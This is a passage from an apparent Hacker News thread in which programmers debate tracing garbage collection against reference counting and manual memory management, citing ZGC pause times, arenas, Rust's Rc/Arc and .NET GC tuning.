structures. reply louthy 16 hours agoparentprevThis makes no sense to me. In a generational GC gen-0 is more likely than not to be cached — and that’s where the ‘churn’ is. Outside of that, any longer lived allocations are by definition not easy to control cache-wise. Locality is one of the big wins for GCs, the only issue I’m aware of is the ‘stop the world’ mark/sweep (yes, I know modern GCs have a background thread — but you still get stop-the-world events afaik) reply fweimer 54 minutes agorootparentModern collectors have stop-the-world pause times in the millisecond range (aiming for less), even for very large heaps. Allocating threads may also incur allocation stalls, also in the millisecond range. However, these collectors need additional barriers in the application, and the concurrently running collector competes with the application for resources even if the application is not paused. Meaningful comparisons are difficult. reply pkolaczk 24 minutes agorootparentThe problem is not only how long the pause takes but also the fact it pauses all the things. In manual memory management even if you have to spend some time in allocation / deallocation, it affects only the allocating thread. A thread that doesn’t allocate doesn’t pause. reply MichaelMoser123 15 hours agoparentprev> I believe calling `free()` gives the memory back to the allocator, which is much better than giving it to the OS Having to deal with memory fragmentation in long running servers is no fun at all, especially internal fragmentation of pages maintained by slab allocators. this is not a very common problem, but it is a hard one to deal with. reply pkolaczk 26 minutes agorootparentFragmentation rarely wastes more than 20% memory and 50% is extremely unlikely. But with tracing GC you’re often wasting 4-5x right from the start. Maybe it’s not called fragmentation, but the room needed for the GC to run efficiently is also waste. Plus all the headers in the objects to keep the marking flags also addup. reply darby_eight 16 hours agoparentprevIf cache usage is that major of a concern, arena allocation works just as well as it does with manual memory allocation. Thankfully there aren't too many areas where garbage collection has to compete with such conveniently contrived examples. reply osigurdson 12 hours agoparentprev>> My opinions might be less sour if I had more experience with compacting GCs I have quite a bit of experience with the GC in .NET. For projects that deal with large data structures, the GC is something that you are always thinking about though it's behavior is conceptually transparent. I think I would ultimately prefer a more explicit approach. reply kazinator 12 hours agoparentprevfree() gives back memory to your local POSIX. :) reply pron 18 hours agoprevExcept in the special case where all memory can be easily handled in arenas, good tracing GCs have long ago surpassed manual memory management in throughput, and more recently their latency impact is more than acceptable for the vast majority of applications (OpenJDK's ZGC has typical pause times measured in double/triple-digit microseconds, and the worst case rarely exceeds 1ms for a reasonable allocation rate -- the pauses are in the same ballpark as OS-induced ones). The only real and significant tradeoff is in memory footprint, and outside of specialty niches (where arenas just work for everything and worst-case latency is in the low microseconds range) that is the only high order question: is my application running in a memory-constrained environment (or it's really worth it to sacrifice other things to keep down RAM consumption) or not? reply flohofwoe 18 hours agoparent> Except in the special case ... IME it's the other way around, per-object individual lifetimes is a rare special case, in most real world code there will be many related objects of the same or very similar lifetimes. In such code, tracking individual object lifetimes is overkill (in the end, memory management is all about lifetimes, and fewer individual lifetimes instead of many is always better because it means less work, both in manual and automatic memory management). Not having to think about object lifetimes is just very convenient, that's why GC languages were successful despite the significant under-the-hood complexity of a good garbage collector. reply pron 18 hours agorootparentThat's not at all a rare special case in most server applications. One way to see that is to consider how much of a program's working set is in threads' stacks vs the heap. If the most of the working set is in the heap, there's usually some non-trivial object lifetimes involved (i.e. cases where lifetimes can be encapsulated and abstracted away from client code). Yes, sometimes all of these can be taken care of by arenas (and there are languages, like Zig, that strive to be very arena-friendly), but that -- i.e. the case where all objects are easily arena-able -- is not the more common scenario. reply flohofwoe 17 hours agorootparentDepends on the type of server I guess. I can easily imagine a situation where all allocations of a request are handled through a simple bump allocator, and once the request is done, the bump allocator is reset instead of 'freeing' each individual allocation. reply cogman10 15 hours agorootparentThis would only work for fairly trivial applications. The moment you start adding things like http clients or databases you have to start considering having connection pools with lifetimes that don't strictly match a request lifecycle. Not saying such an application doesn't exist, it certainly does. reply jayd16 14 hours agorootparentprevHow did we go from \"this is the most common case\" to \"I can imagine it?\" Sure there are cases where a request can be handled by the stack but the point is that the more complex case is extremely common. Any kind of background/asynchronous work spawned from a request and your plans are shot. reply thefaux 10 hours agorootparentYes and that is yet another case for encapsulation. For me, it is an antipattern for a short lived task to be directly creating long lived resources. Async work ideally is scheduled using message passing to the task manager which may have its own memory management strategy (heck, the background task may well be written in an entirely different language). I just feel that it is very common to have large portions of the application that fit the model of read input/write output, free all intermediate data upon completion. Due to a lack of encapsulation, however, we put unnecessary pressure on the allocator or garbage collector by mixing the short and long lived parts of our applications. reply ncruces 15 hours agorootparentprevThat “simple bump allocator” is basically allocating everything on the thread's stack, as the GP mentioned. It's what you put on the heap that has complex lifetimes. Sometimes you can fix that with an arena. If you can't, you probably can't figure out when the last reference to it dies either. reply zozbot234 15 hours agorootparentprev> IME it's the other way around, per-object individual lifetimes is a rare special case It depends on your application domain. But in most cases where objects have \"individual lifetimes\" you can still use reference counting, which has lower latency and memory overhead than tracing GC and interacts well with manual memory management. Tracing GC can then be \"plugged in\" for very specific cases, preferably using a high performance concurrent implementation much like https://github.com/chc4/samsara (for Rust) or https://github.com/pebal/sgcl (for C++). reply pron 14 hours agorootparentReference counting does not have lower latency than a tracing GC nor is it more generally predictable. In terms of performance, it is usually worse than a modern tracing GC by most performance metrics. Its benefits are, indeed, lower memory footprint and that it can achieve reasonable latency even using a crude implementation. In other words, you'd reach for refcounting either if you mostly care about footprint or if you don't have a lot of resources to invest in implementing the GC. Modern concurrent tracing has very little impact on latency. First, compared to refcounting, the barriers are rarely invoked. Second, they compact the heap concurrently in the background, and like all mark-compact GCs, their amortized cost drops to zero as the RAM increases (the work is linear with the size of the working set, which is roughly constant for a given program, but it needs to be done less frequently the more RAM you have). That's why high-performance languages that rely heavily on a GC -- Java, C#, Go -- prefer tracing. reply bluGill 12 hours agorootparentwhen the reference count can only be zero or one reference counts have different performance than when it can be more, and it is much easier to reason about. This is most cases. reply pron 11 hours agorootparentAnd yet, the reason tracing GCs are chosen by virtually all high-performance languages that heavily rely on GC is that they've been found to be faster in practice for the common workloads. One of the reasons why your intuition is not so straightforward is that a tracing GC needs to do no work whatsoever when the number of references is zero. One of the common ways to teach the basics of GC is by starting out as looking at tracing and refcounting as duals: refcounting needs to work to free objects, while tracing works to keep them alive. If you thinking in terms of what work needs to be done to promptly determine when an object becomes garbage, then you're already not thinking in terms of tracing, because tracing never actually needs to learn about when an object becomes garbage (this isn't actually true when they do reference processing, but that's another story). Or, if you want to think about it another way, in a tracing collector there are already only two cases no matter how many pointers there are to an object: reachable or not, i.e. the same one and zero as in your case, only there isn't even a need to ever set the counter to zero. However, in principle tracing and refcounting can be quite similar (https://www.cs.cornell.edu/courses/cs6120/2019fa/blog/unifie...) in their behaviour, but in practice most refcounting GCs in industry use are crude, and don't match the performance of tracing GCs in common use, which are quite sophisticated. reply rbehrends 11 hours agorootparentprevWhat happens if a large std::unordered_map has its destructor called? The maximum number of references is a red herring. While having a RC capped at 1 allows you to elide the actual reference count and makes pointer assignment cheaper, it does not materially affect the primary source of latency in a reference counting implementation, namely cascading deletions. reply bluGill 11 hours agorootparentDon't do that. good data design and architecture is always needed. reply rbehrends 7 hours agorootparent1. Such data structures (or more generally, std::vector> or something like that) are the natural way to represent e.g. dictionaries. So, you absolutely often need to do that and \"don't do that\" doesn't help here. 2. This general issue extends to virtually all collections. The idea that you should avoid large collections is not a practical solution to real world problems. 3. An alternative solution would be lazy destruction, but that comes with its own issues, such as a really bad worst-case memory overhead or making RC sufficiently more complex that it's not really a win over tracing GC anymore [1]. [1] https://citeseerx.ist.psu.edu/document?repid=rep1&type=pdf&d... reply dmurray 12 hours agorootparentprevThis sounds intuitively true. So...what if GC languages could introduce an optional annotation for an object to say that only one reference to it can exist, and use that as a hint to the GC? I don't see how this could be implemented in a safe and performant way - either you check for existing references at runtime, or you risk some use-after-free bug. But perhaps your project is already in a GC language and you're happy with that, but just want to optimise GC for this critical component. And we already have the concept of \"unsafe\" code blocks in many languages. Does anything like this exist? I Googled \"smart pointers in Java\" but just got a bunch of mid-quality answers where people explained that I'm stupid for even asking this and they're unnecessary because Java manages its own memory. But hasn't someone smarter thought of this? reply lll-o-lll 13 hours agorootparentprev> nor is it more generally predictable Can you explain what you mean here? This does not match my experience or intuition. reply pron 13 hours agorootparentIn theory, refcounting and tracing can behave similarly [1], but assuming we're speaking about their implementations in the industry (rather elaborate tracing GCs; rather crude refcounting GCs) then a refcounting GC would do some work as soon the refcount for a particular object drops to zero. When exactly that happens and how much work there is to do (and sometimes, what the fragmentation effect on heap is) are local properties that are not very predictable. In contrast, the amount of work a tracing GC needs to do when compacting is directly proportional to the program's working set and the frequency in which it needs to do that work is proportional to the allocation rate -- both of which are fairly regular and predictable global properties for a given program. For stop-the-world GCs there was then the matter of the highly unpredictable exact timing of a large STW pause, but modern concurrent GCs don't collect anything in STW pauses anymore. They only have very short (sub 1ms) and constant-time pauses and no surprise throttling as long as the allocation rate is within an acceptable range. So all in all, you pay a fairly fixed tax on the CPU (and if you want to pay less, just add more RAM) and virtually no impact on latency. [1]: https://www.cs.cornell.edu/courses/cs6120/2019fa/blog/unifie... reply lll-o-lll 13 hours agorootparentThanks for responding. My experience with tracing GC at scale is exclusively in the realm of .Net, and RC exclusively with C++ smart pointers. That matches your “sophisticated vs crude” contrast. The experience with .Net is that GC impact was difficult to profile and correct, and also “lumpy”, although that may have been before GC tuning. GC would dominate performance profiling in heavy async code, but these days can be corrected by value tasks and other zero alloc methods. For C++ style ref counting, the impact was a continuous % load and simple to profile (and therefore improve). Although here, the ref counting needed to be stripped from the hot paths. The biggest issue I’ve hit between the two modes though, is how they behave when hitting memory limits. Tracing GC appears to have an order of magnitude perf hit when memory becomes scarce, while ref counting does not suffer in this way. This is enough for me to personally dislike tracing GC, as that failure state is particularly problematic. reply neonsunset 13 hours agorootparentWhen you hit memory limits, .NETs GC implementation would perform much more frequent, invasive and aggressive collections, including LOH compaction to reduce memory watermark which leads to greater GC pauses, though this is rarely seen in such a bad way on modern versions with e.g. SRV GC. The most scaling way to address this is usually to just allocate less and use valuetasks with pooling where applicable (frequent asynchronous yields), I'm certain if you built a .NET 8 based solution you would see user-written code dominate heap allocations profile, as most hot internal paths of async utilize said state machine box pooling+ValueTask[0] and may be entirely allocation-free. [0] Example: https://github.com/dotnet/runtime/blob/cc7bf831f02cad241547e... reply lll-o-lll 12 hours agorootparent> When you hit memory limits, .NETs GC implementation would perform much more frequent, invasive and aggressive collections, including LOH compaction to reduce memory watermark which leads to greater GC pauses, though this is rarely seen in such a bad way on modern versions with e.g. SRV GC. The trouble with server GC mode is that then there is no natural back pressure. If the processing is not CPU bound, then memory allocation can grow unbounded. This is not something that happens with RC as, again, the GC performance hit is inlined with task processing. The service may not be capable of as much throughput, but it doesn’t take out the entire server either. > The most scaling way to address this is usually to just allocate less and use valuetasks with pooling where applicable (frequent asynchronous yields), I'm certain if you built a .NET 8 based solution you would see user-written code dominate heap allocations profile, as most hot internal paths of async utilize said state machine box pooling+ValueTask[0] and may be entirely allocation-free. Absolutely; I think it’s relatively simple to write servers that scale using modern .net; the memory allocation foot-guns when dealing with asynchronous code are now well understood, and tooling is good. I am compressing ~15 years of experiences in that previous post. It’s probably the case that a tracing GC is the better choice for most modern applications, excepting memory constrained devices (like phones), and so long as you design with memory in mind. reply neonsunset 11 hours agorootparentAh, I see where you are coming from. You are correct, sustained load heap size of SRV GC has been a known pain point that had been particularly exacerbated after beefy Windows Server hosts fell out of fashion and got replaced by 512Mi Linux containers. There has been work conducted on this each release throughout Core 2.1, 3.1, and then 5, 6, 7 and 8 versions to make it play nicer with more constrained memory limit systems. The two major features that address this are Regions[0] (.NET 6/7) and DATAS[1] (.NET 8). The former is enabled by default everywhere except macOS and the latter is available opt-in either via env var DOTNET_GCDynamicAdaptationMode=1 or msbuild poperty GarbageCollectionAdaptationMode: 1 (see more in [1]). The latter has shown to significantly reduce sustained (or, especially, idling) heap size for some particularly problematic workloads (but not all, sometimes you just have a lot of live objects). I definitely recommend giving it a try if this is something still relevant to you. TLDR of what DATAS does is dynamic heap count scaling and much smarter heap up/downsizing depending on allocation rate/frequency and anticipated throughput impact of adjusting those. [0] https://itnext.io/how-segments-and-regions-differ-in-decommi... / https://devblogs.microsoft.com/dotnet/put-a-dpad-on-that-gc/ [1] https://maoni0.medium.com/dynamically-adapting-to-applicatio... reply bsder 9 hours agorootparentprevReference counting is neither lower latency nor lower memory overhead than basically everything else. Reference counting requires atomics on every single object. Per object atomics are quite unfriendly to modern microprocessors. There is either very little contention with lots of atomics that you don't need or you have high contention with atomics that are blowing out your cache lines repeatedly. In addition, managing reference counts practically requires RAII semantics and all of the baggage that goes along with that. Doing reference counting in C, for example, is extremely error prone. reply kccqzy 8 hours agorootparentThe reason Rust has both Arc and Rc types for reference counting is precisely because most of the time when you need reference counting, you do not need thread safety. This is something I think about all the time in C++ when I use std::shared_ptr: it gives me thread safety using atomics but I don't need it. More languages should distinguish between thread safe reference counting and single-threaded reference counting. reply bsder 6 hours agorootparent> The reason Rust has both Arc and Rc types for reference counting is precisely because most of the time when you need reference counting, you do not need thread safety. Hmmm, I'm curious about your use cases as this is almost precisely opposite my experience. Normally, I regard Rc as a footgun as I've always found that I'm shortly going to have to change everything to Arc. reply cratermoon 17 hours agorootparentprevIn generational GCs there are two or more allocation regions. New objects are put in the \"younger\" generation, which is garbage collected separated from the other generations. This sort of resolves the issue of tracking individual object lifetimes by having all the short-lived objects subject to rapid GC. This means most of the effort tracking lifetimes is reserved for the fewer long-lived objects. reply lll-o-lll 13 hours agorootparentIt’s “medium term” objects that cause all the trouble. Async operations. That’s why .net invested heavily into zero-alloc tasks, as the gc would kill scaling in async heavy code. reply mtzet 1 hour agoparentprev> special case where all memory can be easily handled in arenas That seems to be an unfair bar to set. If _most_ objects are easily allocated by an arena, then that still removes most of the need for GC. I like Jai's thesis that there's four types of memory allocations, from most common to least common: 1. Extremely short lived. Can be allocated on the function stack. 2. Short lived + well-defined lifetime (per frame/request). Can be allocated in a memory arena. 3. Long lived + well-defined owner. Can be managed by a subsystem-specific pool. 4. Long lived + unclear owner. Needs a dynamic memory management approach. If you want to make the claim that tracing GCs surpass manual memory management in general, you should compare to a system written with this in mind, not one that calls malloc/free all over the place. I guess it might be more fair if you compare tracing GC with modern c++/rust practices. I agree that for most systems, it's probably much more _practical_ to rely on tracing GC, but that's a very different statement. reply Thaxll 17 hours agoparentprevPauses are kind of solved but the CPU usage for the GC is still pretty high. You're still at the mercy of unpredictable tail latency and other corner cases. reply pron 17 hours agorootparentThat goes for manual memory management -- and certainly languages with a reference-counting GC, like Rust -- as well. The main difference is by far footprint overhead. reply cesarb 16 hours agorootparent> and certainly languages with a reference-counting GC, like Rust It's a mistake to say that the Rust language has reference counting. There's a pair of reference-counting wrapper types in its standard library (Rc and Arc), or you can roll your own, but there's no special support for these types in the language, and their use is optional. Most of the time, you won't be using these reference-counting types. Box (the generic heap-allocated or \"boxed\" type) doesn't use reference counting. String (and its several specialized variants) doesn't use it. Vec (the generic heap-allocated array type) doesn't use it. HashMap, HashSet, BTreeMap, BTreeSet, none of them use reference counting. And so on. You can write a lot of Rust code without using reference counting even once. What the Rust language has is just C++-style RAII: when a value goes out of scope, if it implements Drop, its Drop::drop is called. reply cogman10 15 hours agorootparent> It's a mistake to say that the Rust language has reference counting. Having these types in the standard library is the language having those types. Perhaps it's not integrated to the level that a language like swift is. However, I think it's reasonable to say the language supports Rc when the standard library supports it. I'd say the same thing about C++ with `shard_ptr`. Otherwise you end up in weird pedantic notions about what a language has or does not have. Does C have a heap? Well, technically no since malloc and free are just function calls in the standard library and you can write valid C programs without calling those functions. reply cesarb 14 hours agorootparent> Having these types in the standard library is the language having those types. It depends on whether you consider the standard library an indivisible part of the language or not. For Rust, it's clearly not the case, since you have the #![no_std] mode in which only a subset of the standard library is available, and this subset does not include these reference counted wrapper types (or any heap-allocated type at all). > Perhaps it's not integrated to the level that a language like swift is. However, I think it's reasonable to say the language supports Rc when the standard library supports it. I'd say the same thing about C++ with `shard_ptr`. It's one thing to say a language \"supports reference counting\", which only means you can use reference counting with it, and another thing to say \"[...] languages with a reference-counting GC\", which implies that the language uses a GC for everything, and that GC is a reference-counting GC. > Does C have a heap? Well, technically no since malloc and free are just function calls in the standard library and you can write valid C programs without calling those functions. It's actually the same thing: C can run on either a \"hosted\" environment or a \"freestanding\" environment, and on the later, most of the standard library is not available, including malloc and free. So C does not necessarily have a heap when running on a freestanding environment. reply arcticbull 13 hours agorootparentIt's not part of std exactly, it's part of alloc. It's re-exported by std. It would still be available in a #![no_std] environment using `extern crate alloc`. This crate generally abstracts over the concept of allocation too, so relying on it doesn't require you to also have an allocator - it just requires someone at some point specify one with #[global_allocator] reply kaba0 15 hours agorootparentprev> and their use is optional It is not, if you have objects with dynamic lifetimes, and allocating them for the whole duration of the program is not an option. Sure, their use can be much less than a managed language that can only do automatic memory management, but RC is objectively a worse from most perspective than tracing GC, except for the fact that they don’t need runtime support, and a slightly lower memory overhead. reply arandomusername 10 hours agorootparent*shared* objects with dynamic lifetimes. With properly architected code, the times you need to use rc are extremely small. reply MForster 17 hours agorootparentprevRust by default doesn't do reference counting. You can opt into reference counting with `std::rc::Rc`. (You can even opt into mark-and-sweep GC using the `gc` crate, but this isn't done much...). reply flohofwoe 17 hours agorootparentprevI think the important thing to understand is that reference counting isn't any better (and often worse) than \"regular\" garbage collection. The point of manual memory management is to come up with problem-specific strategies to avoid or at least reduce dynamic memory allocation, not to insert manual release/free calls for individual objects ;) reply pron 17 hours agorootparentReference counting is regular garbage collections. The two broad classes of GC algorithms are tracing and refcounting, and while they can converge to similar behaviour, usually the former optimises for throughput while the latter for memory footprint; latency is similar these days. reply flohofwoe 17 hours agorootparent> Reference counting is regular garbage collection. ...while I agree, for many C++ and Rust coders statements like this are pure heresy ;) reply cesarb 15 hours agorootparent> ...while I agree, for many C++ and Rust coders statements like this are pure heresy ;) It's a matter of definitions. For many people, \"garbage collection\" refers only to tracing GC, and reference counting is a separate category. In my experience, that's the common usage; insisting that \"reference counting is formally (in some paper from the last century) also defined as a form of GC\" will not magically change the opinions \"many C++ and Rust coders\" have about tracing GC. In fact, I'd say that insisting on this nomenclature point only weakens the whole argument; tracing GC should stand on its own merits, and not on depend on some nomenclature equivalence to be accepted (if quibbling about nomenclature is your strongest argument, your arguments are weak). reply pron 15 hours agorootparentThere's no need to \"change opinions\". People who work on GCs know that reference counting and tracing are the two general GC strategies. The only people who don't think of refcounting as a GC are people who simply aren't familiar with GCs and how they work. If they also think refcounting has lower latencies (let alone higher throughput) than tracing, then they're also just wrong. No one needs to \"insist\" on the GC nomenclature. You're either familiar with it or you're not (and since most people are not, they commonly make mistakes on the subject). Also, given that tracing GCs are used by ~90% the market, they hardly require justification anymore; they've won by a large margin over the application space (which constitutes most of software). However, it's nice to occasionally educate those unfamiliar with the subject on GC algorithms and nomenclature. reply dasyatidprime 13 hours agorootparentI have to wonder whether some of this is semantic drift over time or context. My recollection since undergrad (a few decades ago) involves treating “garbage collection” as referring to tracing garbage collection, and “reference counting” as a separate mechanism. There is still a term for the category including both, only that term is not “garbage collection” but “automatic memory management”. But what I see nowadays is closer to what you describe. reply zozbot234 13 hours agorootparentAutomatic memory management is more general than that, it also includes stack allocation. reply dasyatidprime 13 hours agorootparentI agree; I meant “including” in the non-restrictive sense, not “including only”. Stack allocation is a special case where the lifetimes are arranged in a convenient way—see also escape analysis in languages where stack allocation isn't explicitly supported at the language level but can be added by the compiler. reply ngrilly 14 hours agorootparentprev> Also, given that tracing GCs are used by ~90% the market, they hardly require justification anymore; they've won by a large margin over the application space (which constitutes most of software). Tracing GCs have clearly proven themselves and are everywhere (JVM, CLR, Go, Dart, OCaml, etc.) but we can't ignore that the Apple ecosystem (Swift) is using ARC. That's a significant share of the \"market\". Python and Ruby also use reference counting, but I don't think anyone is considering them state-of-the-art GC. reply zozbot234 14 hours agorootparentExcept that obligate ARC ala Swift has even lower throughput than obligate tracing GC. It's the worst possible choice unless you really care about low-latency and deterministic freeing of resources (and even then, using RAII for common tree-like allocation patterns like Rust does will perform better). reply pron 14 hours agorootparentprevYou're right, I should have said \"languages where GC is the primary means of managing heap memory are used by 90% of the market\" rather than focused on a specific algorithm. reply ngrilly 14 hours agorootparentYes, this is quite fascinating how GC replaced manual memory management in most apps over the last 20~30 years. reply PaulDavisThe1st 15 hours agorootparentprevFrom TFA: > Tools to automate the “actually freeing the memory” part, like lifetimes in Rust and RAII in C++, don’t solve these problems. They absolutely aid correctness, something else you should care deeply about, but they do nothing to simplify all this machinery. reply pjmlp 17 hours agorootparentprevThey should read some CS literature, the kind that is used to write the compilers they rely on. :) reply mdavidn 16 hours agorootparentprevRust is more similar to C++, in that the compiler inserts calls to free as variables exit scope. Runtime reference counting is limited to those objects wrapped with Rc or Arc. I agree with pron’s larger point. GC is fine for most applications. It’s just factually inaccurate to compare Rust’s memory management with languages like Python and PHP. reply adgjlsfhk1 16 hours agorootparentprevthe CPU usage of manual memory is also pretty high. it's just more evenly distributed throughout the program making it harder to observe. reply hyperpape 16 hours agoparentprevWhere are the measurements comparing throughput of tracing GCs and manual memory management? I'm aware of how incredibly hard this area is to measure, but it's a shame that the state of mainstream discussion is \"most people just assume GC implies slow, but then again a handful of people say it's not.\" reply pron 16 hours agorootparentGiven that the no-GC-by-default market is ~10% of the global software market [1] with no signs of shift in either direction over the past couple of decades, which sounds about right to me (considering the percentage of programs that need to run in memory-constrained environment or must have precise control over memory), it seems that the number of those who may benefit significantly from a different choice is small and so it doesn't look like anyone wants or needs to be convinced of anything. \"GC languages\" already command ~90% of the market and have little to gain from such a small market of potential converts, and the others aren't trying or succeeding in increasing their market share, so who cares given the small stakes? [1]: https://www.devjobsscanner.com/blog/top-8-most-demanded-prog... reply znpy 18 hours agoparentprev> (OpenJDK's ZGC has typical pause times measured in double/triple-digit microseconds, and the worst case rarely exceeds 1ms for a reasonable allocation rate -- the pauses are in the same ballpark as OS-induced ones) We've been benchmarking ZGC and Shenandoah at work, and the p100 pause time is usually below 500us (micro-seconds). ZGC seems to be performing a bit better, as it seems to be performing less pauses than Shenandoah (hence doing more work/pause). We still have to run tests-in-production, but so far it seems that GC pauses are largely a solved issue when using ZGC (and Generational ZGC since Java21). reply pron 17 hours agorootparentFYI, ZGC doesn't perform any collection work in the the stop-the-world pauses. They are only required to get all mutator threads to atomically observe the increment of the \"GC epoch\" for all threads. All actual work, both marking and compaction, is done by GC threads running concurrently with the mutator threads or by the mutator threads themselves as they run. It is only when allocation rate is very, very high that an allocating mutator thread will be paused (\"throttled\") for a significant amount of time to allow the GC to catch up by freeing up memory (and if you hit these cases, then you might be better off using a throughput-oriented collector). reply hawk_ 15 hours agorootparentStrangely in our workloads we have noticed generational ZGC latencies are better than G1 at ~99th-99.9th percentile or below but worse at percentiles above that. The allocation rate is moderate. reply loeg 6 hours agorootparentIt can be easy to game metrics like this -- trading off p100 for p99.9 or p99. E.g., defer all the expensive work to 1 in every 10,000 operations. reply kaba0 14 hours agorootparentprevAbove that you might easily get measuring artifacts, like the OS swapping out your process once, or so. reply hawk_ 14 hours agorootparentYes - but it's quite consistent. If it was 'noise' it wouldn't be. reply znpy 15 hours agorootparentprev> FYI, ZGC doesn't perform any collection work in the the stop-the-world pauses. Yeah i know, but on a certain level I don’t care what it does or does not do. I care about my application not having latency spikes due to stop the world pauses :) reply Galanwe 17 hours agorootparentprev> We've been benchmarking ZGC and Shenandoah at work, and the p100 pause time is usually below 500us > so far it seems that GC pauses are largely a solved issue when using ZGC What? 500us is abysmally slow. Most projects I work on have a latency budget of less than 10us, the average being 2us. That is the budget for the whole wire in/wire out for a packet. Even for less latency sensitive workloads, 500us is a no go for most networking application. reply pron 17 hours agorootparentWe're talking about occasional hiccups, not an average-case response-latency overhead. You can't get worst-case latency of 2-10us with a non-realtime kernel. Even a page fault could take longer than that. reply Galanwe 17 hours agorootparent> You can't get worst-case latency of 2-10us with a non-realtime kernel. Even a page fault could take longer than that. You obviously can, and this has nothing to do with the kernel being real-time or not. There is no situation I can think of where a page fault should occur on a properly setup system running a production networking software, meaning no swap, huge TLB, and proper memory management. reply pron 16 hours agorootparentIf you can think of \"no situation\" where a server may incur a page fault, forced preemption, or need to perform any I/O to a service/database, then I hope you at least recognise that your world in no way represents the state of server software at large because none of these things is true for the vast majority of server software. In a former life I worked on some safety-critical onboard avionics software for an ultrasonic platform, and 2us was around the upper-limit worst-case latency (i.e. you'll kill someone if you miss that deadline); still, it's not the kind of requirements the vast majority of software finds itself under. When working over the internet, some of the very best services are at >10ms ping latency anyway, where a 500us hiccup is imperceptible. reply Galanwe 13 hours agorootparent> If you can think of \"no situation\" where a server may incur a page fault, forced preemption, or need to perform any I/O to a service/database, then I hope you at least recognise that your world in no way represents the state of server software at large I won't deny that the majority of software out there is not latency sensitive, but the context of this article is specifically targeting those softwares that are _not_ using garbage collection, arguing that it is undeservedly overlooked. OP even adds that GC is a \"solved problem\" because some GC implementation is 500us worst case latency. My point is that the article author, and OP, are mistaken. Because if you are in the category of \"I write server side software without GC\" (e. g. C/C++), then 500us is horribly wrong. Your point being that 500us is fine for most software out there is surely true, but not relevant, because if that is the case, you're probably not using C/C++, thus this article is not targeting you. In _my world_ as you phrase it, traffic is unshaped. You need to be able to support line rate, otherwise packets are dropped, and hell breaks loose. reply rossjudson 4 hours agorootparentYour \"properly set up system\" is apparently doing nothing other than running your single job. The vast majority of real-world systems have to deal with antagonists. All of the characteristics you mention are true on production systems used in large scale fleets...and yet \"bumps\" happen...because there's never one thing happening. It's all the things, and it's always changing. I'm gonna guess you do finance. A six microsecond fiber oneway is a thing of beauty. There are certain technical luxuries associated with that domain, and rarely any requirement to exhibit high utilization rates...or deal with antagonists running on the same hardware. reply Galanwe 1 hour agorootparentFinance is one of such use cases, but there's a lot more, and that's the use case for people not using GC, thus why I find this article (and the comment saying 500us is a solved problem) pedantic. I wrote code profilers for instance, which also need perfectly predictable latency. I worked on L2 and L3 networking applications (bridging, routing, forwarding) that need line rate support. People working on audio sampling, or codecs have the same constraints, etc. There's a whole world of applications where 500us is ridiculously slow. The article takes the OS as example, but if my OS has 500us random latency spikes, I would be horrified. reply pebal 1 hour agorootparentThe article doesn't say anything about acceptable pause times. GC can be completely pause-free. reply naasking 4 hours agorootparentprev> because if that is the case, you're probably not using C/C++ The point is that this claim is more wrong than it should be, eg. that C/C++ is still used more than it should be partly because these GC myths persist, hence the article. reply Galanwe 2 hours agorootparentI think at the end we're debating if the glass is half full or half empty. I claim that people are not ignorant and if they use C/C++, they are aware of what a GC implies, and cannot afford it. The article claims that people are somehow wrongly mislead to think they _need_ C/C++ while a GC'ed language would be alright. I don't think people are dumb. I think given the choice, any sane person would pick Python or similar to write an application, and that thinking they don't because they don't know more is pedantic. reply keybored 18 hours agoprevThe article motivates RCU and then does a u-turn and starts making a general argument for general-purpose GC. Not quite a trojan horse but a bit whiplash provoking. reply o11c 17 hours agoparentI definitely wouldn't call the RCU thing a GC, since at no point is the object garbage. It is in one of 3 states, and changes between them as quickly as possible: * active * obsolete but alive for old readers * deallocated Note that depending on how you write your code, it may be possible to reuse an \"obsolete-but-alive\" object for a \"new\" allocation safely, though I haven't analyzed performance for this in full. As usual for GC discussions, it is very handwavy about when you have to \"fall back to `shared\\_ptr/Arc`\", when in fact avoiding refcounts (either because you can prove you already have ownership (which does have implications for tail calls, but you shouldn't use those anyway), or by avoiding indirection entirely) is the whole point of serious refcount-based systems. Doing nothing at all is obviously better than GC's \"do something, sometime\". reply naasking 4 hours agorootparentRCU objects are garbage when they're held by old readers thay will no longer utilize them in the remaining code path before they exit. This code path is virtually always of non-zero length, because ensuring they are deallocated in the absolute shortest path is an NP-class problem for sure. I don't see why the fact that this code path might sometimes be longer in GC would preclude RCU from being GC. reply nemetroid 8 hours agorootparentprevIt’s not entirely clear from the article, but the part about rcu_defer() is not just a ”what if?” segue into GC, it’s how RCU is typically used. reply mwkaufma 16 hours agoprev(1) the pivot from rcu to general purpose tracing gcs is bait-and-switch. (2) Manual memory management is more than just malloc/free calls -- it's about layout (e.g. struct-of-arrays, inlining, implicit offsets, packing, etc) reply titzer 11 hours agoparentFor (2) Virgil has several features that allow you to layout memory with various levels of control. I assume you meaning \"array of structs\", and you can do that with arrays of tuples, which will naturally be flattened and normalized based on the target (i.e. will be array-of-structs on native targets). You can define byte-exact layouts[1] (mostly for interfacing with other software and parsing binary formats), unbox ADTs, and soon you can even control the exact encoding of ADTs. Virgil is GC'd. [1] https://github.com/titzer/virgil/blob/master/doc/tutorial/La... reply mwkaufma 10 hours agorootparentSkimming [1], Virgil Layouts resemble ArrayBuffers in JavaScript -- a boxed view of some native span of memory. If I'm reading that right, it's basically an escape-hatch from the GC for \"mixed\" environments -- the buffer itself is owned by a GC'd proxy, but it doesn't doesn't e.g. contain GC references internally. That's useful for lots of low-level interfaceing (e.g. communicating with serial interfaces or device drivers), but one couldn't, however, build an \"allocator\" in a Layout for GC'd objects the way, e.g., in native code you can make a \"bump allocator\" for arbitrary structs which are \"free\"ed with just a pointer-reset (pretty important, e.g., in game engines, which is my field). reply titzer 10 hours agorootparentThe last part is correct; layouts are not GC'd objects. They are views over byte arrays (or mmap'd memory, or unsafe regions like the execution stack). The first part is partially incorrect; layouts are not \"boxed\"--they are represented underneath as a pair of a (potentially null) GC object and a pointer-sized offset into that object. So with that representation you can have a reference to an off-heap layout as well. Layouts are a little underpowered right now, owing mostly to the conservatism in that they could always be aliased by a byte array or any other alias, thus their bytes are chaos-bits that cannot be trusted. Adding the ability to have pointers between layouts is another level; for that, I am envisioning reads of pointers requiring a second capability which is the expected region into which the pointers lie. But all of the layout stuff is fundamentally not about performance, it's about interfacing with external software and hardware. In Virgil the expectation that you should use the good, type- and memory-safe constructs like classes, arrays, tuples, ADTs, etc. These are plenty efficient and getting new annotations to control their representation in a more fine-grained way. reply im3w1l 2 hours agorootparentprevI think struct-of-arrays was a quite delibarate wording. It stands out as a strategy that is at odds with object orientation and is sometimes more efficient. reply kaba0 14 hours agoparentprevI disagree with 2 being manual memory 